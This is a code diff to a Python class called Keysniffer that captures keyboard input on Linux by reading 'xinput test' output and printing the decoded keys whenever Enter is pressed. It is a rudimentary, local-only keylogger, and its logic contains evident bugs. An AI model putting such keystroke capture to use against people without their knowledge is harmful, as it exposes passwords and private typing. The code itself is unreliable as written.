@@ -158,39 +158,35 @@ class Keysniffer():
 		"""
 
 		# Get the code for the Enter key so we know when newlines happen.
-		def get_enter_code(enter_code=''):
-			for code in self.keycodes:
-				if code[1] == '(Enter)':
-					enter_code.append(code[1])
-					break
-				else:
-					continue
-		enter = get_enter_code()
+		for code in self.keycodes:
+			if code[1] == '(Enter)':
+				enter = code[1]
+				break
+			else:
+				continue
 
-		while(1):
-			# Call xinput to start sniffing keycodes and pipe its output 
-			keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
-					stdout=subprocess.PIPE, 
-					universal_newlines=True)
-			
-			
-			stream_buffer = []
-			for line in keystream.stdout:
-				while len(stream_buffer) < 64:
-					if "release" in line and enter not in line:
-						code = str(line).strip().split()
-						stream_buffer.append(code[-1])
-					elif enter in line:
-						stream_buffer.append('<break>')
-						break
-			
-			raw_keys = self.codesToKeys(stream_buffer)
-			final_string = ''
-			for char in raw_keys:
-				stripped_keys = []
-				stripped_keys.append(char[1])
-			
-			print(stripped_keys)
+		# Call xinput to start sniffing keycodes and pipe its output 
+		keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
+				stdout=subprocess.PIPE, 
+				universal_newlines=True)
+		
+		stream_buffer = []
+		for line in keystream.stdout:
+			if "release" in line and str(enter) not in line:
+				stream_buffer.append(str(line).strip().split()[-1])
+			elif str(enter) in line:
+				# stream_buffer.append('<break>')
+				raw_keys = self.codesToKeys(stream_buffer)
+				final_string = ''
+				for char in raw_keys:
+					stripped_keys = []
+					stripped_keys.append(char[1])
+				
+				print(stripped_keys)
+				
+			else:
+				pass
+
 
 def main():
 	ks = Keysniffer()
